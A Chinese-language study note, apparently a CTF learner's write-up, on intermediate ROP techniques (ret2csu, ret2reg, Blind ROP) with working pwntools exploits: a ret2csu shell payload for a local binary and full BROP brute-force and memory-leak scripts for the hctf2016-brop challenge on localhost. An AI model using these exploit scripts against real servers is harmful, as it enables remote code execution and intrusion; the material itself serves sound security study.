# 中级ROP

[TOC]





## x86与x64回顾

- x86

  - **函数参数**在**函数返回地址**的上方

- x64

  - System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 **RDI, RSI, RDX, RCX, R8 和 R9 寄存器**中，如果还有更多的参数的话才会保存在栈上。

    ```python
    rdi -> rsi -> rdx -> rcx -> r8 -> r9
    ```

  - 内存地址不能大于 0x00007FFFFFFFFFFF，**6 个字节长度**，否则会抛出异常。

## ret2csu

> 在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 `__libc_csu_init `中的 `gadgets`。这个函数是用来对 `libc` 进行初始化操作的，而一般的程序都会调用 `libc` 函数，所以这个函数一定会存在



### __libc_csu_init

> 使用文件`level`，由于官方给出的level带有**编译优化**，即像这样：

```assembly
--------------------------------------------------------------------------
.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]
.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]
.text:0000000000400610                 mov     r12, [rsp+38h+var_20]
.text:0000000000400615                 mov     r13, [rsp+38h+var_18]
.text:000000000040061A                 mov     r14, [rsp+38h+var_10]
.text:000000000040061F                 mov     r15, [rsp+38h+var_8]
.text:0000000000400624                 add     rsp, 38h
.text:0000000000400628                 retn
--------------------------------------------------------------------------
```

实际上我们所需要的是`__libc_csu_init`中的下面这一段

> 重新编译得到了`level`，因此本篇分析`level`
>
> 编译指令
>
> ```shell
> gcc -no-pie -g -fno-stack-protector  -o level level.c
> ```

`__libc_csu_init`代码

> 查看汇编代码指令（风格：intel）
>
> ```shell
> objdump -S -mi386:x86-64:intel level
> ```

代码

```assembly
004011c0 <__libc_csu_init>:
  4011c0:	f3 0f 1e fa          	endbr64 
  4011c4:	41 57                	push   r15
  4011c6:	4c 8d 3d 43 2c 00 00 	lea    r15,[rip+0x2c43]        # 403e10 <__frame_dummy_init_array_entry>
  4011cd:	41 56                	push   r14
  4011cf:	49 89 d6             	mov    r14,rdx
  4011d2:	41 55                	push   r13
  4011d4:	49 89 f5             	mov    r13,rsi
  4011d7:	41 54                	push   r12
  4011d9:	41 89 fc             	mov    r12d,edi
  4011dc:	55                   	push   rbp
  4011dd:	48 8d 2d 34 2c 00 00 	lea    rbp,[rip+0x2c34]        # 403e18 <__do_global_dtors_aux_fini_array_entry>
  4011e4:	53                   	push   rbx
  4011e5:	4c 29 fd             	sub    rbp,r15
  4011e8:	48 83 ec 08          	sub    rsp,0x8
  4011ec:	e8 0f fe ff ff       	call   401000 <_init>
  4011f1:	48 c1 fd 03          	sar    rbp,0x3
  4011f5:	74 1f                	je     401216 <__libc_csu_init+0x56>
  4011f7:	31 db                	xor    ebx,ebx
  4011f9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
-------------------------------------------------------------
[2]
  401200:	4c 89 f2             	mov    rdx,r14
  401203:	4c 89 ee             	mov    rsi,r13
  401206:	44 89 e7             	mov    edi,r12d
  401209:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
 ------------------------------------------------------------- 
 [3]
 * 40120d:	48 83 c3 01          	add    rbx,0x1
 * 401211:	48 39 dd             	cmp    rbp,rbx
 * 401214:	75 ea                	jne    401200 <__libc_csu_init+0x40>
   401216:	48 83 c4 08          	add    rsp,0x8
-------------------------------------------------------------
[1]
  40121a:	5b                   	pop    rbx
  40121b:	5d                   	pop    rbp
  40121c:	41 5c                	pop    r12
  40121e:	41 5d                	pop    r13
  401220:	41 5e                	pop    r14
  401222:	41 5f                	pop    r15
  401224:	c3                   	ret    
-------------------------------------------------------------
  401225:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  40122c:	00 00 00 00 
```

因此只需要借助

* [1]`pop-ret`结构

  > `rbx`等会**间接**影响到后续的控制

  ```assembly
    40121a:	5b                   	pop    rbx
    40121b:	5d                   	pop    rbp
    40121c:	41 5c                	pop    r12
    40121e:	41 5d                	pop    r13
    401220:	41 5e                	pop    r14
    401222:	41 5f                	pop    r15
    401224:	c3                   	ret    
  ```

* [2] 控制参数`rdi ->rsi ->rdx ->rcx ->r8 ->r9`

  > 1. 此处控制的是 
  >    * param3 : rdx
  >    * param2 : rsi
  >    * param1( low-32-bit ) : edi  -> rdi 高32位会清零
  >
  > 2. 如果我们可以合理地控制 `r15` 与 `rbx`，那么我们就可以调用我们想要调用的函数
  >    * rbx = 0 , r15 为存储我们想要调用的函数的地址

  ```assembly
    401200:	4c 89 f2             	mov    rdx,r14
    401203:	4c 89 ee             	mov    rsi,r13
    401206:	44 89 e7             	mov    edi,r12d
    401209:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  ```

* [3] 控制函数不跳转

  > 我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行
  >
  > `jne    401200 <__libc_csu_init+0x40>`
  >
  > 进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。

  ```assembly
   * 40120d:	48 83 c3 01          	add    rbx,0x1
   * 401211:	48 39 dd             	cmp    rbp,rbx
   * 401214:	75 ea                	jne    401200 <__libc_csu_init+0x40>
  ```



### 分析`level`

> 查看漏洞函数

```C
void __cdecl vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  read(0, buf, 0x200uLL);
}
```

> 查看`__libc_csu_init`
>
> 虽然开启了`RELRO`，但是`file`查看时并没有去除符号，因此是可见的
>
> ```python
> $ file level
> level: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a28f7d9fc82c9c62d5e572365f45d29b78239d50, for GNU/Linux 3.2.0, with debug_info, not stripped <------ !!! ----
> ```

查看反汇编内容（得到内存地址）

```assembly
disassemble __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x00000000004011c0 <+0>:	endbr64 
   0x00000000004011c4 <+4>:	push   r15
   0x00000000004011c6 <+6>:	lea    r15,[rip+0x2c43]        # 0x403e10
   0x00000000004011cd <+13>:	push   r14
   0x00000000004011cf <+15>:	mov    r14,rdx
   0x00000000004011d2 <+18>:	push   r13
   0x00000000004011d4 <+20>:	mov    r13,rsi
   0x00000000004011d7 <+23>:	push   r12
   0x00000000004011d9 <+25>:	mov    r12d,edi
   0x00000000004011dc <+28>:	push   rbp
   0x00000000004011dd <+29>:	lea    rbp,[rip+0x2c34]        # 0x403e18
   0x00000000004011e4 <+36>:	push   rbx
   0x00000000004011e5 <+37>:	sub    rbp,r15
   0x00000000004011e8 <+40>:	sub    rsp,0x8
   0x00000000004011ec <+44>:	call   0x401000 <_init>
   0x00000000004011f1 <+49>:	sar    rbp,0x3
   0x00000000004011f5 <+53>:	je     0x401216 <__libc_csu_init+86>
   0x00000000004011f7 <+55>:	xor    ebx,ebx
   0x00000000004011f9 <+57>:	nop    DWORD PTR [rax+0x0]
   0x0000000000401200 <+64>:	mov    rdx,r14
   0x0000000000401203 <+67>:	mov    rsi,r13
   0x0000000000401206 <+70>:	mov    edi,r12d
   0x0000000000401209 <+73>:	call   QWORD PTR [r15+rbx*8]
   0x000000000040120d <+77>:	add    rbx,0x1
   0x0000000000401211 <+81>:	cmp    rbp,rbx
   0x0000000000401214 <+84>:	jne    0x401200 <__libc_csu_init+64>
   0x0000000000401216 <+86>:	add    rsp,0x8
   0x000000000040121a <+90>:	pop    rbx
   0x000000000040121b <+91>:	pop    rbp
   0x000000000040121c <+92>:	pop    r12
   0x000000000040121e <+94>:	pop    r13
   0x0000000000401220 <+96>:	pop    r14
   0x0000000000401222 <+98>:	pop    r15
   0x0000000000401224 <+100>:	ret    
End of assembler dump.
```

#### payload

```python
Payload
	>Low Address
     +-------------+
     | cyclic      | <--- hexToDecimal(0x80-0x00) + 8 = 136 bytes
     | ret         | <--- 关键(64位下的 16-bytes 栈对齐)
     | pop_rdi_ret |
     | addr_bin_sh |
     | addr_system |
     +-------------+
	>High Address
```

* 破解前需要先关闭`ASLR`

* gdb调试过程中到最后`segmental fault`，程序停留在了

  ```python
  0x7ffff7e13e3c <do_system+364>    movaps xmmword ptr [rsp + 0x50], xmm0
  ```

  经查看`rsp`的值为

  ```python
  rsp   0x7fffffffd838
  ```

  没有`16-bytes`对齐，因此`rsp+0x50`没有对齐，然而`movaps`需要`16-bytes`对齐，因此执行失败，需要查找ret指令的位置填充栈空间

#### 报错`dbg`图

<img src="D:\Github\pwn\pwn_study\images\ret2csu_segment_fault.png" alt="ret2csu_segment_fault" style="zoom:38%;" />

#### exploit

```python
from pwn import *

""" VA from __libc_csu_init """
pop_rbx = 0x40121b
pop_rdi_ret = 0x401223
ret_addr = 0x40101a

""" offset from database """
offset___libc_start_main_ret = 0x24083
offset_system = 0x0000000000052290
offset_dup2 = 0x000000000010e8c0
offset_read = 0x000000000010dfc0
offset_write = 0x000000000010e060
offset_str_bin_sh = 0x1b45bd
offset___libc_start_main = 0x0000000000023f90
offset_puts = 0x0000000000084420
offset_exit = 0x0000000000046a40

""" addr of functions in libc """
addr_write = 0x7ffff7ed0060

libcBase = addr_write - offset_write

addr_system = libcBase + offset_system  # shell function addr

addr_str_bin_sh = libcBase + offset_str_bin_sh  # parameter

addr_exit = libcBase + offset_exit  # exit function

io = process('./level')

# io = gdb.debug("./level","break main")

# payload = flat(cyclic(132),pop_rdi_ret,addr_str_bin_sh,addr_system,pop_rdi_ret,0,)

payload = b'a' * 136 + p64(ret_addr) +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(0) + p64(addr_exit)

# payload_error = b'a' * 136 +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(0) + p64(addr_exit)

io.sendline(payload)
# io.sendline(payload)

io.interactive()
```



#### 栈对齐

> 栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。我们都知道栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。

* 即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。
* 因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：
* 任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。
* 大多数函数的栈帧的边界都必须是16直接的倍数。

如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。

```assembly
movups
mov //移动指令
u //不必16字节对齐
ps //（packed single-precision floating-point）表示打包的单精度浮点数

movaps
mov //移动指令
u //必需16字节对齐
ps //（packed single-precision floating-point）表示打包的单精度浮点数
```





## ret2reg

> ### 原理
>
> 1. 查看溢出函返回时哪个寄存值指向溢出缓冲区空间
> 2. 然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址
> 3. reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)



## BROP

> * `Blind ROP` : BROP(Blind ROP) 于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014，其论文题目是 **Hacking Blind**
> * BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流

### 攻击条件 

1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
2. **服务器端的进程在崩溃之后会重新启动**，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。



### 基本思路

在 BROP 中，基本的遵循的思路如下

- 判断栈溢出长度

  - 暴力枚举

- Stack Reading

  - 获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。

  - 目前经典的栈布局

    ```C
    buffer|canary|saved fame pointer|saved returned address
    ```

  * 在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。

    ```python
    >>> 原理 <<<
    调节payload的长度,每次暴力破解一个字节的内容(即payload尾部),如果该byte破解,则payload再加一字节的内容,作为`canary`中的下一部分(byte)
    ------------------------------
    Every Byte includes 256 = 2^8
    32-bit : 4 * 2^8 = 2^10 = 1024
    64-bit : 8 * 2^8 = 2^11 = 2048
    ------------------------------
    ```

    

    ![stack_reading](D:\Github\pwn\pwn_study\images\stack_reading.png)

    

- Blind ROP

  - 最朴素的执行 write 函数的方法就是构造系统调用。

    ```assembly
    pop rdi; ret # socket
    pop rsi; ret # buffer
    pop rdx; ret # length
    pop rax; ret # write syscall number
    syscall
    ```

    但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为**找 write**的方式来获取。

  - 找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。

    - rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可

      - 但是，在程序中很少出现

        ```python
        pop rdx; ret
        ```

    - 控制 rdx 的数值

      > 这里需要说明执行 `strcmp` 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。

  - 那么接下来的问题，我们就可以分为两项

    - 寻找 gadgets
      - 控制参数`rdi`和`rsi`
    - 寻找 PLT 表
      - write 入口
      - strcmp 入口

- Build the exploit

  - 利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。



#### BROP gadgets

> 从不同偏移处开始反汇编，可以得到对不同`register`的控制！！！
>
> 最关键的是`pop rdi`和`rsi`，设计64位的头两个参数

![brop_gadget](D:\Github\pwn\pwn_study\images\brop_gadget.png)

```assembly
pwndbg> disassemble 0x4007ba,0x4007c5
Dump of assembler code from 0x4007ba to 0x4007c5:
   0x00000000004007ba <__libc_csu_init+90>:	pop    rbx
   0x00000000004007bb <__libc_csu_init+91>:	pop    rbp
   0x00000000004007bc <__libc_csu_init+92>:	pop    r12
   0x00000000004007be <__libc_csu_init+94>:	pop    r13
   0x00000000004007c0 <__libc_csu_init+96>:	pop    r14
   0x00000000004007c2 <__libc_csu_init+98>:	pop    r15
   0x00000000004007c4 <__libc_csu_init+100>:	ret    
End of assembler dump.

pwndbg> disassemble 0x4007ba+0x7,0x4007c5
Dump of assembler code from 0x4007c1 to 0x4007c5:
   0x00000000004007c1 <__libc_csu_init+97>:	pop    rsi
   0x00000000004007c2 <__libc_csu_init+98>:	pop    r15
   0x00000000004007c4 <__libc_csu_init+100>:	ret    
End of assembler dump.

pwndbg> disassemble 0x4007ba+0x9,0x4007c5
Dump of assembler code from 0x4007c3 to 0x4007c5:
   0x00000000004007c3 <__libc_csu_init+99>:	pop    rdi
   0x00000000004007c4 <__libc_csu_init+100>:	ret    
End of assembler dump.
```



#### stop gadgets

> 所谓`stop gadget`一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。之所以要寻找 `stop gadgets`，是因为当我们猜到某个 gadgtes 后，如果我们仅仅是将其布置在栈上，由于执行完这个 gadget 之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会 crash。这样的话，在攻击者看来程序只是单纯的 crash 了

##### 定义栈上的三种地址Probe

- Probe
  - 探针，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。
- Stop
  - 不会使得程序崩溃的 stop gadget 的地址。
- Trap
  - 可以导致程序崩溃的地址

#### stack 探测

* 我们可以通过在栈上摆放不同顺序的 **Stop** 与 **Trap** 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子
  * `probe,stop,traps(traps,traps,...)`
    - 我们通过程序崩溃与否 (如果程序在 probe 处直接崩溃怎么判断) 可以找到不会对栈进行 pop 操作的 gadget，如
      - ret
      - xor eax,eax; ret
  * `probe,trap,stop,traps`
    - 我们可以通过这样的布局找到**只是弹出一个栈变量**的 gadget。如
      - pop rax; ret
      - pop rdi; ret
  * `probe, trap, trap, trap, trap, trap, trap, stop, traps`
    - 我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的... ...这里一般来说会遇到两处比较有意思的地方
      - `plt` 处不会崩，，
      - `_start` 处不会崩，相当于程序重新执行。
      - 需要注意的是向 BROP 这样的一下子弹出 6 个寄存器的 gadgets，程序中并不经常出现。
* 需要注意的是 `probe` 可能是一个 stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为 trap 地址即可。因为如果是 stop gadget 的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.

#### 寻找 plt

> 如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 `16` 字节。而且，在每一个表项的 `6` 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。

![brop_plt](D:\Github\pwn\pwn_study\images\brop_plt.png)

> 对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了**一系列的长度为 16 的没有使得程序崩溃的代码段**，那么我们有一定的理由相信我们遇到了 `plt` 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。



#### 控制 rdx

> * 并不是所有的程序都会调用 strcmp 函数
>
> * 这里给出程序中使用 strcmp 函数的情况。
>
> * 定义以下两种地址
>
>   - readable，可读的地址。
>   - bad, 非法地址，不可访问，比如说 0x0。
>
> * 如果控制传递的参数为这两种地址的组合，会出现以下四种情况
>
>   - strcmp(bad,bad)
>   - strcmp(bad,readable)
>   - strcmp(readable,bad)
>   - strcmp(readable,readable)
>
>   只有最后一种格式，程序才会正常执行。
>
> * 没有 PIE 保护的时候，64 位程序的 ELF 文件的 `0x400000` 处有 7 个非零字节。



#### 寻找输出函数

> 寻找输出函数既可以寻找 write，也可以寻找 puts。一般现先找 puts 函数。不过这里为了介绍方便，先介绍如何寻找 write。

##### 寻找write@plt

当我们可以控制 write 函数的三个参数的时候，我们就可以再次遍历所有的 plt 表，根据 write 函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值

- 使用 rop chain，同时使得每个 rop 对应的文件描述符不一样
- 同时打开多个连接，并且我们使用相对较高的数值来试一试。

需要注意的是

- linux 默认情况下，一个进程最多只能打开 1024 个文件描述符。
- posix 标准每次申请的文件描述符数值总是当前最小可用数值。

当然，我们也可以选择寻找 puts 函数。

##### 寻找puts@plt

寻找 `puts` 函数 (这里我们寻找的是`plt`)，我们自然需要控制 `rdi` 参数，在上面，我们已经找到了 `brop gadget`。那么，我们根据 `brop gadget` 偏移 9 可以得到相应的 `gadgets`（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。所以我们可以根据这个来进行判断。一般来说，其 payload 如下

```python
payload = b'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```



## writeup_brop

> 采取题目是`hctf2016-brop`

### 确定栈溢出长度

```python
from pwn import *

def getbuffer_len():
  i=1
  while 1:
    try:
      io = remote('127.0.0.1',9999)
      io.recvuntil(b'WelCome my friend,Do you know password?\n')
      io.send(i*b'a')
      output = io.recv()
      io.close()
      if not output.startswith(b'No password'):
        return i-1
      else:
        i+=1
    except EOFError:
        io.close()
        return i-1


if __name__ == "__main__":
    buffer_len = getbuffer_len()
    print("The length of buffer overflow is ",buffer_len)
```

最终得到`buffer`长度

<img src="D:\Github\pwn\pwn_study\images\brop_buffer_len.png" alt="brop_buffer_len" style="zoom:50%;" />

首先确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。



### 寻找 stop gadgets

> 通常addr初始值设为`0x400000`，但这个题目我为了节约时间就改成`0x4006b0`，通常在`_start`入口处前后会有`stop_gadgets`

```python
def get_stop_addr(length):
  addr = 0x4006b0  # No PIE
  while 1 :
    try :
      io = remote('127.0.0.1', 9999)
      io.recvuntil(b'WelCome my friend,Do you know password?\n')
      payload = b'a'*length + p64(addr)
      print('Temporary address is 0x%x'%(addr))
      io.sendline(payload)
      content = io.recv()  # if recv() doesn't cause crash, it means that it is a stop gadgets
      io.close()  # sometimes _start will not cause crash
      print('One success addr: 0x%x' % (addr))
      print('When the addr is found successfully, you will recieve the message from the remote: ',content)
      return addr
    except Exception:
      addr += 1
      io.close()
```

结合中间输出可以让结果有迹可循一点，次数找到了`0x4006b6`，为了找到开始地址，可以输出程序没有崩溃时的接收结果，看是否与程序开始时候的提示一致。

![brop_stop_gadgets](D:\Github\pwn\pwn_study\images\brop_stop_gadgets.png)



### 寻找 brop gadgets

> 此处是为了找到`__libc_csu_init`的末尾那一段重要部分，即
>
> ```assembly
> [*] 
> pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15, ret
> [*] + 0x7 
> pop rsi, pop r15, ret
> [*] + 0x9
> pop rdi, ret
> ```
>
> 需要借助
>
> ```C
> > probe, trap, trap, trap, trap, trap, trap, stop, traps
> 
> [*] probe : testing pointer.
> [*] traps : (trap, trap,...), you can add 10 traps or more to avoid the special situations.
> [*] Sometimes p64(0) is a good example of trap.
> ```
>
> 来识别

识别`brop gadgets`代码如下

```python
def get_brop_gadget(length, stop_addr, addr):
  try:
    io = remote('127.0.0.1',9999)
    io.recvuntil(b'WelCome my friend,Do you know password?\n')
    payload = b'a'*length + p64(addr) + p64(0)*6 + p64(stop_addr) + p64(0)*10
    io.sendline(payload)
    content = io.recv()
    io.close()
    print(content)
    # stop gadget returns memory
    if not content.startswith(b'WelCome'): <---注意这里判断的必须是 bytes 类型, 所以需要在string头加一个b
      return False
    return True
  except:
    io.close()
    return False
  
def check_brop_gadget(length, addr):
  """ Just for checking brop possible gadget """
  try:
    io = remote('127.0.0.1',9999)
    io.recvuntil(b'WelCome my friend,Do you know password?\n')
    payload = b'a'*length + p64(addr) + b'a'*8*10
    io.sendline(payload)
    io.close()
    return False
  except:
    io.close()
    return True
  
def brop_gadget(length, stop_gadget, init_addr):
  addr = init_addr
  while 1:
    print(hex(addr))
    if get_brop_gadget(length, stop_gadget, addr):
      print('possible brop gadget: 0x%x' % (addr))
      if check_brop_gadget(length, addr):
        print('success brop gadget: 0x%x' % (addr))
        break
    addr += 1
  return addr
```



### 确定 addr->puts@plt

> #### Method
>
> 1. 对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。
> 2. 寻找 puts 函数 (这里我们寻找的是`plt`)，我们自然需要控制 `rdi` 参数，在上面，我们已经找到了 `brop gadget`。那么，我们根据 `brop gadget` 偏移 `0x9` 可以得到相应的 `gadgets`（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，`0x400000` 处为 ELF 文件的头部，其内容为 `\ x7fELF`。所以我们可以根据这个来进行判断。一般来说，其 payload 如下

1. 关于`rdi_ret`的获取

   ```python
   rdi_ret = brop_gadget_addr + 0x9
   ```

2. 关于`payload`

```python
def get_puts_addr(length, rdi_ret, stop_gadget):
  addr = 0x400000
  while True:
    print(hex(addr))
    io = remote('127.0.0.1', 9999)
    io.recvuntil(b'password?\n')
    payload = b'A'*length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
    io.sendline(payload)
    try:
      content = io.recv()
      if content.startswith(b'\x7fELF'):  
        # remenber add 'b' to your string
        print('Find puts@plt addr: 0x%x' % (addr))
        return addr
      io.close()
      addr += 1
    except Exception:
      io.close()
      addr += 1 
```

最终得到地址为`0x400555`（不同的`libc`地址是不同的）

> 借此可以确定在泄漏`puts@got`地址后找到`puts`的真正的地址，进而泄漏`libc`的版本

![brop_puts@plt](D:\Github\pwn\pwn_study\images\brop_puts@plt.png)

### 泄漏 addr->puts@got

> 1. 泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell
> 2. 我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了，0x1000 = 16 bytes * 256

```python
def leak_unit(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
  io = remote('127.0.0.1',9999)
  payload = b'a'*length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
  io.recvuntil(b'password?\n')
  io.sendline(payload)
  try:
    data = io.recv()
    io.close()
    try:
      data = data[:data.index(b'\nWelCome')]
    except Exception:
      data = data
    if data == "":
      data = '\x00'
    return data
  except Exception:
    io.close()
    return None
  
def leak_memory(length, stop_gadget, brop_gadget, rdi_ret, puts_plt, init_addr):
  result = ""
  addr = init_addr
  while addr < 0x401000:
    print('\n', hex(addr))
    data = leak_unit(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None:
      continue
    else:
      result += data
    addr += len(data)
  """ Restore the memory leaked from the exploit script """
  with open('code', 'wb') as f:
    f.write(result)
```

 













## 安全机制

### RELRO

1. 在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.
2. GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.
3. 设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。

`gcc`编译：

```makefile
gcc -o test test.c						// 默认情况下，是Partial RELRO
gcc -z norelro -o test test.c			// 关闭，即No RELRO
gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO
gcc -z now -o test test.c				// 全部开启，即
```



### 机制开/关指令总结

```python
> 各种安全选择的编译参数如下:
----------------------------------------------------------------------------------------------
* NX：-z execstack / -z noexecstack (关闭 / 开启)
* Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)
* PIE：-no-pie / -pie (关闭 / 开启)
* RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)
```







## Tips

### pwntools技巧

> 直接使用
>
> `sh = gdb.debug('./filename', "break main")`
>
> 来替代
>
> `sh = process('./filename')`
>
> 实现管道连接下的断点！！！

```python
from pwn import *
payload=b'aaaaaa'
sh=gdb.debug("pwn","break main")
sh.sendline(payload)
```



### linux技巧

* 报错`Address already in use`

  ```python
  netstat -apn | grep port <--端口值
  --- 查到pid
  or: ps -ef | grep port
  --- 查看pid以及user
  kill -9 pid
  --- 杀死进程即可
  ```

* 





## ubuntu 搭建本地服务器测试

#### 使用socat本地搭建测试

```python
终端 1: socat tcp-l:6666,fork exec:./文件名,reuseaddr	
终端 2: nc 0.0.0.0 6666   测试
```

1. **服务器端的进程在崩溃之后会重新启动**，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序**最初启动**的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。
2. 可以开两个`terminal`，然后一个作为**服务器**在后台运行，另一个可以脚本攻击等。

















